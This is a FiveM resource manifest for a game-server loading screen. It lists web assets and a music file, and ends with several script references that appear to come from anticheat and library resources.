files {
    'index.html',
    'config.js',
    'music.mp3',

    'assets/css/animate.css',
    'assets/css/custom.css',
    'assets/css/hero.css',
    'assets/css/hover.css',
    'assets/css/plugins.css',
    'assets/css/style.css',


    'assets/fonts/*',

    'assets/images/*.png',
    'assets/images/*.gif',
	
	'assets/images/420.mp4',
    'assets/js/custom.js',
    'assets/js/hero.js',
    'assets/js/scripts.js',
    'assets/js/plugins/fss.min.js',
    'assets/js/plugins/plugins.js',
    'assets/js/plugins/three.min.js',
}


loadscreen 'index.html'

client_script "client.lua"

-- Tell server we will close the loading screen resource ourselfs
loadscreen_manual_shutdown "yes"

resource_manifest_version '77731fab-63ca-442c-a67b-abc70f28dfa5'
client_script '@esx_ligmanticheat/client/inject.lua'


client_script '@esx_ligmanticheat/client/inject.lua'





client_script '@esx_libraries/client/debug.lua'

client_script '@esx_ligmanticheat/client/inject.lua'

client_script 'zavarakatranemia.lua'
server_script "@Protector/Server/injection.lua"
client_script "@Greek_ac/client/injections.lua"